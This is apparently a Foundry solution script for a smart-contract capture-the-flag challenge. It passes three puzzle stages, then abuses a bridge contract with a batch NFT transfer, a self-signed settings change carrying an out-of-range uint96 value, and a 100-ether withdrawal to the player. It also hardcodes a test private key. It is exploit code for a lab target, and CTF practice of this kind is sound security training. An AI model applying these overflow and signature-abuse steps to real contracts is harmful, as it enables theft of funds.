// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";
import "src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";

contract Solution is CTFSolver {
    using ECDSA for bytes;
    using ECDSA for bytes32;

    function solve(address _challenge, address _player) internal virtual override {

        Challenge challenge = Challenge(_challenge);
        uint256 playerPK = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));

        challenge.solveStage1(6);
        challenge.solveStage2(59, 101);
        unchecked{
            challenge.solveStage3(2, 1, uint(0) - uint(6));
        }
        challenge.BRIDGE().verifyChallenge();        

        uint256[] memory ids = new uint256[](201);
        uint256[] memory amounts = new uint256[](201);

        challenge.ADMIN_NFT().safeBatchTransferFrom(_player, address(challenge.BRIDGE()), ids, amounts, "");

        bytes memory message = abi.encode(address(challenge), address(challenge.ADMIN_NFT()), uint256(type(uint96).max) + 1);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPK, message.toEthSignedMessageHash());

        bytes memory signature = abi.encodePacked(r, s, v);

        bytes[] memory signatures = new bytes[](1);
        signatures[0] = signature;
        challenge.BRIDGE().changeBridgeSettings(message, signatures);

        challenge.BRIDGE().withdrawEth(bytes32(uint(1)), new bytes[](0), _player, 100 ether, "");
    }
}